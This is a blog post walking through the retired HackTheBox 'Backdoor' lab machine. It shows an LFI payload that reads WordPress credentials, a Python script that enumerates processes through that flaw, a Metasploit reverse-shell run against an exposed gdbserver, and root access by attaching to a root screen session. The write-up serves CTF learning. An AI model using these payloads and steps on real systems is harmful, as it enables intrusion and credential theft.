<!doctype html><html class=no-js lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="IE=edge"><title>HackTheBox: "Backdoor" Walkthrough - Micha's Attic</title><script>(function(e,t){e[t]=e[t].replace("no-js","js")})(document.documentElement,"className")</script><meta name=description content><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=dns-prefetch href=//fonts.googleapis.com><link rel=dns-prefetch href=//fonts.gstatic.com><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700"><link rel=stylesheet href=/css/style.css><link rel="shortcut icon" href=/favicon.ico></head><body class=body><div class="container container--outer"><header class=header><div class="container header__container"><div class=logo><a class=logo__link href=/ title="Micha's Attic" rel=home><div class="logo__item logo__text"><div class=logo__title>Micha's Attic</div><div class=logo__tagline>My personal blog about all kind of software, hardware, electronics and CTF related topics.</div></div></a></div><div class=divider></div></div></header><div class="wrapper flex"><div class=primary><main class=main role=main><article class=post><header class=post__header><h1 class=post__title>HackTheBox: "Backdoor" Walkthrough</h1><div class="post__meta meta"><div class="meta__item-datetime meta__item"><svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg><time class=meta__text datetime=2022-04-24T00:00:00+02:00>April 24, 2022</time></div></div></header><div class="content post__content clearfix"><p>The now retired <em>Backdoor</em> machine on HackTheBox is supposed to be an &ldquo;easy&rdquo; machine, so
it should be absolutely straight-forward. Let&rsquo;s see!</p><h2 id=foothold>Foothold</h2><p>On this machine, I started with a directory scan, using the <code>fuzz-Bo0oM.txt</code> list, which
usually yields good results - at least on HackTheBox. We&rsquo;ll notice that directory
listing is enabled almost everywhere, so we can also explore manually.</p><p>In the end, we&rsquo;ll find a pretty standard WordPress installation with a
single plugin called &ldquo;ebook-download&rdquo; enabled - for which we will find a LFI vuln pretty quick:</p><div class=highlight><pre tabindex=0 style=background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plain data-lang=plain><span style=display:flex><span>.../filedownload.php?ebookdownloadurl=../../../wp-config.php
</span></span></code></pre></div><p>Neat - we can download the WordPress configuration, containing credentials for the database.
But it seems we can&rsquo;t do anything with the credentials for the database server.</p><p>Let&rsquo;s continue with a port scan:</p><div class=highlight><pre tabindex=0 style=background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plain data-lang=plain><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
</span></span><span style=display:flex><span>|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
</span></span><span style=display:flex><span>|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
</span></span><span style=display:flex><span>80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 (Ubuntu)
</span></span><span style=display:flex><span>|_http-title: Backdoor &amp;#8211; Real-Life
</span></span><span style=display:flex><span>|_http-generator: WordPress 5.8.1
</span></span><span style=display:flex><span>1337/tcp open  waste?
</span></span></code></pre></div><p>Of course, <code>1337/tcp</code> stands out. But what kind of service is running there?
We can try a few simple things: Try to open it in a browser, try to SSH and as last resort,
try telnet. Sadly, none of that works.</p><p>Now, the next step took me a while: Using Linux, we can read <code>/proc/&lt;pid>/cmdline</code>
to get information about a running process, so we might be able to find
the process which has opened port 1337. We only need to know the PID - which we don&rsquo;t.
So let&rsquo;s use the LFI we found earlier to scan a range of PIDs.</p><p>To be honest, this script could have been <em>a lot</em> easier - but somehow I got the idea
&ldquo;I want to scan faster - I need multiple connections&rdquo;, so I ended up with this.
Maybe I&rsquo;m able to use it again in the future üòâ</p><p>(<em>Disclaimer: I&rsquo;m not an async Python expert, so forgive me (or maybe even tell me)
if there is a bad mistake.</em>)</p><div class=highlight><pre tabindex=0 style=background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#069;font-weight:700>import</span> <span style=color:#0cf;font-weight:700>asyncio</span>
</span></span><span style=display:flex><span><span style=color:#069;font-weight:700>import</span> <span style=color:#0cf;font-weight:700>aiohttp</span>
</span></span><span style=display:flex><span><span style=color:#069;font-weight:700>from</span> <span style=color:#0cf;font-weight:700>aiohttp</span> <span style=color:#069;font-weight:700>import</span> ClientSession, ClientConnectorError
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#09f;font-style:italic># https://stackoverflow.com/a/61478547</span>
</span></span><span style=display:flex><span><span style=color:#069;font-weight:700>async</span> <span style=color:#069;font-weight:700>def</span> <span style=color:#c0f>gather_with_concurrency</span>(n, <span style=color:#555>*</span>tasks):
</span></span><span style=display:flex><span>    semaphore <span style=color:#555>=</span> asyncio<span style=color:#555>.</span>Semaphore(n)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#069;font-weight:700>async</span> <span style=color:#069;font-weight:700>def</span> <span style=color:#c0f>sem_task</span>(task):
</span></span><span style=display:flex><span>        <span style=color:#069;font-weight:700>async</span> <span style=color:#069;font-weight:700>with</span> semaphore:
</span></span><span style=display:flex><span>            <span style=color:#069;font-weight:700>return</span> <span style=color:#069;font-weight:700>await</span> task
</span></span><span style=display:flex><span>    <span style=color:#069;font-weight:700>return</span> <span style=color:#069;font-weight:700>await</span> asyncio<span style=color:#555>.</span>gather(<span style=color:#555>*</span>(sem_task(task) <span style=color:#069;font-weight:700>for</span> task <span style=color:#000;font-weight:700>in</span> tasks))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#069;font-weight:700>async</span> <span style=color:#069;font-weight:700>def</span> <span style=color:#c0f>fetch_html</span>(url: <span style=color:#366>str</span>, session: ClientSession, <span style=color:#555>**</span>kwargs) <span style=color:#555>-&gt;</span> <span style=color:#366>tuple</span>:
</span></span><span style=display:flex><span>    <span style=color:#069;font-weight:700>try</span>:
</span></span><span style=display:flex><span>        resp <span style=color:#555>=</span> <span style=color:#069;font-weight:700>await</span> session<span style=color:#555>.</span>request(method<span style=color:#555>=</span><span style=color:#c30>&#34;GET&#34;</span>, url<span style=color:#555>=</span>url, <span style=color:#555>**</span>kwargs)
</span></span><span style=display:flex><span>    <span style=color:#069;font-weight:700>except</span> ClientConnectorError:
</span></span><span style=display:flex><span>        <span style=color:#069;font-weight:700>return</span> (url, <span style=color:#f60>404</span>, <span style=color:#c30>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#069;font-weight:700>return</span> (url, resp<span style=color:#555>.</span>status, <span style=color:#069;font-weight:700>await</span> resp<span style=color:#555>.</span>text())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#069;font-weight:700>async</span> <span style=color:#069;font-weight:700>def</span> <span style=color:#c0f>make_requests</span>(urls: <span style=color:#366>set</span>, <span style=color:#555>**</span>kwargs) <span style=color:#555>-&gt;</span> <span style=color:#069;font-weight:700>None</span>:
</span></span><span style=display:flex><span>    <span style=color:#069;font-weight:700>async</span> <span style=color:#069;font-weight:700>with</span> ClientSession() <span style=color:#069;font-weight:700>as</span> session:
</span></span><span style=display:flex><span>        tasks <span style=color:#555>=</span> []
</span></span><span style=display:flex><span>        <span style=color:#069;font-weight:700>for</span> url <span style=color:#000;font-weight:700>in</span> urls:
</span></span><span style=display:flex><span>            tasks<span style=color:#555>.</span>append(
</span></span><span style=display:flex><span>                fetch_html(url<span style=color:#555>=</span>url, session<span style=color:#555>=</span>session, <span style=color:#555>**</span>kwargs)
</span></span><span style=display:flex><span>            )
</span></span><span style=display:flex><span>        results <span style=color:#555>=</span> <span style=color:#069;font-weight:700>await</span> gather_with_concurrency(<span style=color:#f60>10</span>, <span style=color:#555>*</span>tasks)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#069;font-weight:700>for</span> result <span style=color:#000;font-weight:700>in</span> results:
</span></span><span style=display:flex><span>        <span style=color:#366>print</span>(<span style=color:#c30>f</span><span style=color:#c30>&#39;</span><span style=color:#a00>{</span><span style=color:#366>str</span>(result[<span style=color:#f60>2</span>])<span style=color:#a00>}</span><span style=color:#c30>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#069;font-weight:700>if</span> __name__ <span style=color:#555>==</span> <span style=color:#c30>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    urls <span style=color:#555>=</span> [(
</span></span><span style=display:flex><span>            <span style=color:#c30>f</span><span style=color:#c30>&#34;http://10.10.11.125/wp-content/plugins/ebook-download/&#34;</span>
</span></span><span style=display:flex><span>            <span style=color:#c30>f</span><span style=color:#c30>&#34;filedownload.php?ebookdownloadurl=/proc/</span><span style=color:#a00>{</span>i<span style=color:#a00>}</span><span style=color:#c30>/cmdline&#34;</span>
</span></span><span style=display:flex><span>        ) <span style=color:#069;font-weight:700>for</span> i <span style=color:#000;font-weight:700>in</span> <span style=color:#366>range</span>(<span style=color:#f60>10000</span>)]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    asyncio<span style=color:#555>.</span>run(make_requests(urls<span style=color:#555>=</span>urls))
</span></span></code></pre></div><p>This scan yields (with some garbage removed in the beginning and end,
due to the way the download script works):</p><div class=highlight><pre tabindex=0 style=background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plain data-lang=plain><span style=display:flex><span>suuser-ccd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;
</span></span><span style=display:flex><span>bash-ccd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;
</span></span><span style=display:flex><span>gdbserver--once0.0.0.0:1337/bin/true
</span></span></code></pre></div><p>Finally! On port 1337 there seems to be a <code>gdbserver</code> running. That seems
pretty unusual but why not - let&rsquo;s see what we can do with this.</p><h2 id=user>User</h2><p>After some research, we find the <code>exploit/multi/gdb/gdb_server_exec</code> payload
in metasploit. I used the following configuration, where everything should be
pretty self-explanatory, except for <code>set target 1</code>: 0 is x86, 1 is x86_64.
Using the wrong architecture, running the exploit will fail with the message:</p><blockquote><p>The payload architecture is incorrect: the payload is x86, but x64 was detected from gdb.</p></blockquote><div class=highlight><pre tabindex=0 style=background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plain data-lang=plain><span style=display:flex><span>msf6 &gt; use exploit/multi/gdb/gdb_server_exec
</span></span><span style=display:flex><span>[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
</span></span><span style=display:flex><span>msf6 exploit(multi/gdb/gdb_server_exec) &gt; set LHOST 10.10.14.5
</span></span><span style=display:flex><span>LHOST =&gt; 10.10.14.5
</span></span><span style=display:flex><span>msf6 exploit(multi/gdb/gdb_server_exec) &gt; set LPORT 4444
</span></span><span style=display:flex><span>LPORT =&gt; 4444
</span></span><span style=display:flex><span>msf6 exploit(multi/gdb/gdb_server_exec) &gt; set RHOSTS 10.10.11.125
</span></span><span style=display:flex><span>RHOSTS =&gt; 10.10.11.125
</span></span><span style=display:flex><span>msf6 exploit(multi/gdb/gdb_server_exec) &gt; set RPORT 1337
</span></span><span style=display:flex><span>RPORT =&gt; 1337
</span></span><span style=display:flex><span>msf6 exploit(multi/gdb/gdb_server_exec) &gt; set target 1
</span></span><span style=display:flex><span>target =&gt; 1
</span></span><span style=display:flex><span>msf6 exploit(multi/gdb/gdb_server_exec) &gt; set payload payload/linux/x64/shell/reverse_tcp
</span></span><span style=display:flex><span>payload =&gt; linux/x64/shell/reverse_tcp
</span></span><span style=display:flex><span>msf6 exploit(multi/gdb/gdb_server_exec) &gt; run
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[*] Started reverse TCP handler on 10.10.14.5:4444
</span></span><span style=display:flex><span>[*] 10.10.11.125:1337 - Performing handshake with gdbserver...
</span></span><span style=display:flex><span>[*] 10.10.11.125:1337 - Stepping program to find PC...
</span></span><span style=display:flex><span>[*] 10.10.11.125:1337 - Writing payload at 00007ffff7fd0103...
</span></span><span style=display:flex><span>[*] 10.10.11.125:1337 - Executing the payload...
</span></span><span style=display:flex><span>[*] Sending stage (38 bytes) to 10.10.11.125
</span></span><span style=display:flex><span>[*] Command shell session 2 opened (10.10.14.5:4444 -&gt; 10.10.11.125:54214 ) at 2022-04-24 15:15:56 -0400
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span>uid=1000(user) gid=1000(user) groups=1000(user)
</span></span></code></pre></div><p>Done! üëç</p><h2 id=root>Root</h2><p>For privilege escalation, I&rsquo;m going to ask LinPEAS for an idea. Under the section
&ldquo;Unix Sockets Listening&rdquo; there is an unusual entry: <code>/run/screen/S-root/964.root</code>.</p><p>So there seems to be a screen session running. We cannot directly access this socket file:</p><div class=highlight><pre tabindex=0 style=background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plain data-lang=plain><span style=display:flex><span>drwx------  2 root root  60 Apr 24 18:13 S-root
</span></span></code></pre></div><p>But as this is an &ldquo;easy&rdquo; machine, there are no false trails - so it&rsquo;s highly likely
that we <em>must</em> do something with the <code>screen</code> command.</p><p>As I had literally no idea what do to, I Googled <em>&ldquo;access root screen session as user&rdquo;</em>
(or something similar - didn&rsquo;t write down the exact search term üòâ), which
lead to <a href=https://unix.stackexchange.com/a/163878>this post</a>. The interesting part being:</p><div class=highlight><pre tabindex=0 style=background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plain data-lang=plain><span style=display:flex><span>screen -x host_username/session_name
</span></span></code></pre></div><p>We know the username is <code>root</code> and the session name is also <code>root</code>, so let&rsquo;s try</p><div class=highlight><pre tabindex=0 style=background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plain data-lang=plain><span style=display:flex><span>$ screen -x root/root
</span></span></code></pre></div><p>&mldr; and we will find ourselves in a screen session with a root shell!</p><p>NB: Using a non-upgraded reverse shell, this command fails with the message:</p><blockquote><p>Must be connected to a terminal.</p></blockquote><h2 id=conclusion-and-learnings>Conclusion and Learnings</h2><p>Although this is an &ldquo;easy&rdquo; machine, I struggled a bit after finding the LFI.
Enumerating the processes using <code>/proc</code> was something I didn&rsquo;t think off right away.
I spent way too much time on the Python script, but also learned a bit while writing it.
Also, I learned that just because a socket is not readable does not mean I can&rsquo;t do
anything with it. Finally, I learned about screen multi-user mode.</p><p>All in all:
I had some fun with this machine, despite the setup not looking very realistic
(except for the LFI).</p></div><footer class=post__footer><div class="post__tags tags clearfix"><svg class="tags__badge icon icon-tag" width="16" height="16" viewBox="0 0 32 32"><path d="M32 19c0 1-1 2-1 2L21 31s-1 1-2 1-2-1-2-1L2 16c-1-1-1.4-2-1.4-2S0 12.5.0 11V3C0 1.5.8.8.8.8S1.5.0 3 0h8c1.5.0 3 .6 3 .6S15 1 16 2l15 15s1 1 1 2zM7 10a3 3 0 100-6 3 3 0 000 6z"/></svg><ul class=tags__list><li class=tags__item><a class="tags__link btn" href=/tags/hackthebox/ rel=tag>hackthebox</a></li><li class=tags__item><a class="tags__link btn" href=/tags/ctf/ rel=tag>ctf</a></li></ul></div></footer></article></main></div></div><footer class=footer><div class="container footer__container flex"><div class=footer__copyright>&copy; 2023 Micha's Attic.
<span class=footer__copyright-credits>Generated with <a href=https://gohugo.io/ rel="nofollow noopener" target=_blank>Hugo</a> and <a href=https://github.com/Vimux/Mainroad/ rel="nofollow noopener" target=_blank>Mainroad</a> theme.</span></div></div></footer></div><script async defer src=/js/menu.js></script></body></html>